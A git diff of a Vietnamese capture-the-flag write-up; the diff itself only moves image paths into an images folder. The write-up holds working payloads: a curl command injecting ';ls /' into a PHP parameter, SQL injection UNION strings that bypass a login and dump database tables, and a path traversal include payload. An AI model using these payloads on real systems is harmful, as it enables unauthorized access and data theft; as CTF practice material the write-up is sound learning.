@@ -9,8 +9,8 @@
 ### Solution
 - Ở đây đề bài cho 1 file ảnh với kích thước `0x0` kết hợp cùng tên đề bài mình đoán sẽ sửa 8 byte chiều dài và rộng để khôi phục lại bức ảnh ban đầu.
 - Tool mình sử dụng ở đây là [png-dimensions-bruteforcer](https://github.com/cjharris18/png-dimensions-bruteforcer), điều chỉnh range bruteforce lên xíu ta sẽ thu được kết quả.
-![](2023-07-23-16-14-05.png)
-![](2023-07-23-16-14-49.png)
+![](images/2023-07-23-16-14-05.png)
+![](images/2023-07-23-16-14-49.png)
 ```
 Flag: W1{d1meNsiOn_i5_cO0l_r19ht?}
 ```
@@ -39,7 +39,7 @@ show_source(__FILE__);
 - Ở bài này source code khá đơn giản đầu tiên là mình phải bypass được ký tự `_` trong `input_data`, thì ở đây đơn giản ta chỉ cần **URL encode** ký tự `_` sẽ bypass được điều kiện đầu tiên.
 - Sang với điều kiện thứ 2, trong đầu mình đặt ra 1 câu hỏi là làm sao có thể truyền cùng lúc data cho `$_GET` và `$_POST`, giải pháp là ta sẽ sử dụng lệnh `curl` với option `-d` hoặc có thể gửi trực tiếp request thông qua `BurpSuite`
 
-![](2023-07-23-10-06-39.png)
+![](images/2023-07-23-10-06-39.png)
 - Câu lệnh hoàn chỉnh như sau: `curl -d input_data=%3Bls%20%2F http://45.122.249.68:20018/\?input%5fdata\=`
 - Request sẽ được gửi dưới dạng như sau
 ```http
@@ -57,7 +57,7 @@ Content-Type: application/x-www-form-urlencoded
 input_data=%3Bls%20%2F
 ```
 - Kết quả nhận được là
-![](2023-07-23-10-14-34.png)
+![](images/2023-07-23-10-14-34.png)
 
 ```
 Flag: W1{ez_head1_huh}
@@ -97,20 +97,20 @@ Flag: W1{webhook_not_so_bad_huh?}
 
 ### Solution
 - Bài này khá tương tự với 1 bài đã giải trong traning, cơ bản **flag** gồm 3 phần nằm hết ở database.
-![](2023-07-23-10-56-15.png)
+![](images/2023-07-23-10-56-15.png)
 - Sơ qua về trang web thì ở trang `index.php` sẽ cung cấp cho ta 1 form login và qua file `login.php` khi ta đăng nhập thành công sever sẽ redirect qua `/news.php`. Ở dòng 13 ta có thể thực hiện **SQL Injection** để bypass qua phần login.
-![](2023-07-23-10-58-50.png)
+![](images/2023-07-23-10-58-50.png)
 - Có 1 chú ý là ở file `news.php`, sever sẽ kiểm tra xem `$_SESSION['username']` của chúng ta có phải là `admin` hay không nên payload để **SQLi** phần login sẽ như sau:
     - `username`: `admin`
     - `password`: `' UNION SELECT username,password FROM users WHERE username='admin`
 - Ở `/news.php` có 1 đoạn code khá *nhạy cảm* giúp chúng ta có thể truyền vào biến `$_GET['name']` qua đó có thể đọc nội dung từ database.
-![](2023-07-23-11-04-09.png)
+![](images/2023-07-23-11-04-09.png)
 - Payload cho **Part 1**: `' UNION SELECT flag, flag FROM secret -- `
-![](2023-07-23-11-07-36.png)
+![](images/2023-07-23-11-07-36.png)
 - Ở **Part 2** thì flag nằm trong 1 bảng ta chưa biết tên nên ta có thể sử dụng payload `' UNION SELECT table_name, column_name FROM INFORMATION_SCHEMA.COLUMNS -- ` để in ra thông tin bao gồm tên các bảng và cột.
-![](2023-07-23-11-09-50.png)
+![](images/2023-07-23-11-09-50.png)
 - Payload cho **Part 2**: `' UNION SELECT flag_5959595959408498_5959595959408498, flag_5959595959408498_5959595959408498 FROM secret_8489498498112318_8489498498112318 -- `
-![](2023-07-23-11-10-34.png)
+![](images/2023-07-23-11-10-34.png)
 - Ở **Part 3** thì flag là mật khẩu của tài khoản `admin`, ở đây cách để khai thác sẽ là `bruteforce`. Xoá cookie đang có để reset `$_SESSION` rồi bruteforce password từ trang `login.php`. Script bruteforce như sau: *(ban đầu mình bruteforce theo kiểu truyền thống thì độ phức tạp khá lớn, hết giải có người anh chỉ điểm nên mình áp dụng binsearch giúp giảm độ phức tạp đi khá nhiều)*
 ```py
 import requests
@@ -152,7 +152,7 @@ while not found:
         if c == "}":
             break
 ```
-![](2023-07-23-15-58-12.png)
+![](images/2023-07-23-15-58-12.png)
 ```
 Flag: W1{part1_part2_part③_ⓓⓔⓙⓐⓥⓤ_福🐳😁}
 ```
@@ -167,10 +167,10 @@ Flag: W1{part1_part2_part③_ⓓⓔⓙⓐⓥⓤ_福🐳😁}
 ### Solution
 - Sơ qua về source code thì ở `Dockerfile` của backend thì ta thấy flag nằm ở `/flag.txt`, `Ctrl+Shift+F` thì thấy nội dung của file được sử dụng ở `admin/index.php` vậy thì trước tiên ta cần truy cập được endpoint này.
 - Ở file `index.php` của backend ta có thể thấy `$_GET["id"]` được nối chuỗi trực tiếp vào `articles/news` và đoạn code còn sử dụng 1 hàm khá nguy hiểm là `include()`
-![](2023-07-23-17-44-00.png)
+![](images/2023-07-23-17-44-00.png)
  nên ta có thể `LFI` đến endpoint `admin/index.php` thông qua payload `?id=../../../admin/index.php`
- ![](2023-07-23-17-46-46.png)
+ ![](images/2023-07-23-17-46-46.png)
  - Nội dung của file `/flag.txt` được **XOR** với `username` và gán kết quả vào biến `$_SESSION["id"]`
- ![](2023-07-23-18-22-18.png)
+ ![](images/2023-07-23-18-22-18.png)
  - Giải thích sơ qua về hàm `do_xor`, hàm này thực hiện **XOR** 2 chuỗi nếu `$str_2` có độ dài chưa bằng `$str_1` sẽ thêm `=` vào cuối `$str_2` tới khi 2 chuỗi bằng độ dài. Hàm thực hiện **XOR** lần lượt từng ký tự và nối vào `$result` và dùng `-` để ngăn cách giữa các kết quả.
 - Vậy ở đây cần thực hiện `SQLi` để login thành công và có được `$_SESSION["id"]` rồi thực hiện `reverse XOR` và lấy được **flag**.
